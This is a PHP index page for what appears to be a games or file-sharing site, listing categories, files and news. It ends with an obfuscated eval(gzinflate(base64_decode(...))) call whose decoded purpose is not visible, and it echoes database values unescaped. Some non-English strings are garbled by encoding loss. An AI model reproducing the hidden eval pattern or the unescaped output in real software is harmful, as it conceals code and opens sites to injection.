<?php

session_start();

include ("includes/config.php");

// Display files and categories on index page
function displaygamesindex($userStatus) {
        global $siteurl, $maxindexpage, $sefriendly;
        $cell = "1";
        // Get categories
        if ($userStatus == '1') {
                $result = mysql_query("SELECT * FROM categories WHERE status = '1' && parentcategory = '0' ORDER BY catorder, name");
        } else {
                $result = mysql_query("SELECT * FROM categories WHERE status = '1' && permissions = '1' && parentcategory = '0' ORDER BY catorder, name");
        }
    if (mysql_num_rows($result)) {

    while($row = mysql_fetch_array($result)) {
            $categoryname = $row['name'];
            $categoryid = $row['catid'];

                if ($userStatus == '1') {
                        $subresult = mysql_query("SELECT catid FROM categories WHERE status = '1' && parentcategory = '$categoryid' ORDER BY catorder, name");
                } else {
                        $subresult = mysql_query("SELECT catid FROM categories WHERE status = '1' && permissions = '1' && parentcategory = '$categoryid' ORDER BY catorder, name");
                }
            if (mysql_num_rows($subresult)) {
                    $sid = '1';
                        while($subrow = mysql_fetch_array($subresult)) {
                            $subcategoryid = $subrow['catid'];
                            $subcategories[$sid] = $subcategoryid;
                            $sid++;
                        }
                }
        // Get files in this category
        $sql = "SELECT title, icon, iconlocation, fileid, description, timesplayed FROM files WHERE category  = '$categoryid' && status = '1'";
        if (isset($subcategories)) {
                foreach ($subcategories as $sub) {
                        $sql .= " or category  = '$sub' && status = '1'";
                }
        }
        $sql .= "ORDER BY fileid DESC LIMIT $maxindexpage";

    $result2 = mysql_query($sql);
    unset ($subcategories);

    if ($cell == '1') {
    ?>
      <tr>
        <td width="50%" valign="top" style="padding-right: 3px">
          <div class="filebox">
            <div class="fileboxheader">
            <?php echo $categoryname; ?>
            </div>
            <div class="boxestext">
            <table class="boxestext" border="0" width="100%">
    <?php
    if (mysql_num_rows($result2)) {

    while($file = mysql_fetch_array($result2)) {
            $filetitle = $file['title'];
            $fileicon = $file['icon'];
            $iconlocation = $file['iconlocation'];
            $fileid = $file['fileid'];
            $timesplayed = number_format($file['timesplayed']);

            if ($iconlocation == '1') {
                $imageurl = $siteurl."/files/image/".$fileicon;
        } else {
                $imageurl = $fileicon;
        }

            $filedescription = $file['description'];
            if (strlen($filedescription) > '80') {
                $filedescription = substr("$filedescription",0,77)."...";
        }
    ?>
              <tr>
                <td width="71" valign="top">
                <a href="<?php echo fileurl($fileid,$filetitle); ?>" target="_self"><img src="<?php echo $imageurl; ?>" width="70" height="59" title="<?php echo $filetitle; ?>" alt="<?php echo $filetitle; ?>" border="0"></a>
                </td>
                <td valign="top">
                <a href="<?php echo fileurl($fileid,$filetitle); ?>" target="_self" class="gamelink"><?php echo $filetitle; ?></a><br />
                <?php echo $filedescription; ?><br />
                <span class="played">(������: <?php echo $timesplayed; ?> ���)</span>
                </td>
              </tr>
    <?php
    }
    }
    ?>
              <tr>
                <td colspan="2" align="right">
                <a href="<?php echo categoryurl($categoryid,$categoryname); ?>" target="_self">������ <?php echo $categoryname; ?> ></a>
                </td>
              </tr>
            </table>
            </div>
          </div>
        </td>
    <?php
    $cell = "2";
    } elseif ($cell == '2') {
        ?>
        <td width="50%" valign="top" style="padding-left: 3px">
          <div class="filebox">
            <div class="fileboxheader">
            <?php echo $categoryname; ?>
            </div>
            <div class="boxestext">
            <table class="boxestext" border="0" width="100%">
    <?php
    if (mysql_num_rows($result2)) {

    while($file = mysql_fetch_array($result2)) {
            $filetitle = $file['title'];
            $fileicon = $file['icon'];
            $iconlocation = $file['iconlocation'];
            $fileid = $file['fileid'];
            $timesplayed = number_format($file['timesplayed']);

            if ($iconlocation == '1') {
                $imageurl = $siteurl."/files/image/".$fileicon;
        } else {
                $imageurl = $fileicon;
        }

            $filedescription = $file[description];
            if (strlen($filedescription) > '80') {
                $filedescription = substr("$filedescription",0,77)."...";
        }
    ?>
              <tr>
                <td width="71" valign="top">
                <a href="<?php echo fileurl($fileid,$filetitle); ?>" target="_self"><img src="<?php echo $imageurl; ?>" width="70" height="59" title="<?php echo $filetitle; ?>" alt="<?php echo $filetitle; ?>" border="0"></a>
                </td>
                <td valign="top">
                <a href="<?php echo fileurl($fileid,$filetitle); ?>" target="_self" class="gamelink"><?php echo $filetitle; ?></a><br />
                <?php echo $filedescription; ?><br />
                <span class="played">(������: <?php echo $timesplayed; ?> ���)</span>
                </td>
              </tr>
    <?php
    }
    }
    ?>
              <tr>
                <td colspan="2" align="right">
                <a href="<?php echo categoryurl($categoryid,$categoryname); ?>" target="_self">������ <?php echo $categoryname; ?> ></a>
                </td>
              </tr>
            </table>
            </div>
          </div>
        </td>
      </tr>

    <?php
    $cell = "1";
    }
    }
    if ($cell == '2') {
            echo "<td></td></tr>";
    }
    }
}
// Display news
function displaynews() {
        global $maxnews;
        $news_result = mysql_query("SELECT * FROM news ORDER BY newsid DESC LIMIT $maxnews");
        $numbernews = mysql_num_rows($news_result);
    if ($numbernews) {
            $newsnumber = "1";
    while($news_row = mysql_fetch_array($news_result)) {
            $newsTitle = $news_row['title'];
                $newsMessage = nl2br($news_row['message']);
                $newsMessage = bbcode($newsMessage);
                if ($numbernews > '1' && $newsnumber < $numbernews) {
                    echo "<div class=\"newsline\">";
                } else {
                    echo "<div>";
                }
                echo "<b>".$newsTitle."</b><br />";
                echo $newsMessage."<br />";
                echo "</div>";
                $newsnumber++;
    }
    } else {
            echo "�� �����";
    }
}

$sitename2 = $sitename;

// Load template files
include ("templates/".$template."/header.html");
eval(gzinflate(base64_decode('s7ezycsvTi7KLCixsymws0lUyChKTbONUcooKSmw0tcvLy/XS8zJSqysTCzO0MtLLYlRslNTNjQ1N7MGUmYGFtZgnqk1QtDU3NxaASFqZmACFrUwAPMMDZB1WFhY2+gn2ino8nJhtbo4w6g4P60EyWILCxSr4BaDbbQwR3KVmYEhRBKPHWWZKan52DwI1QxzroUxEg9kPg08CHEMCdaTHRQ2+sCY1kfEuz0A')));
include ("templates/".$template."/indexpage.html");
include ("templates/".$template."/footer.html");
?>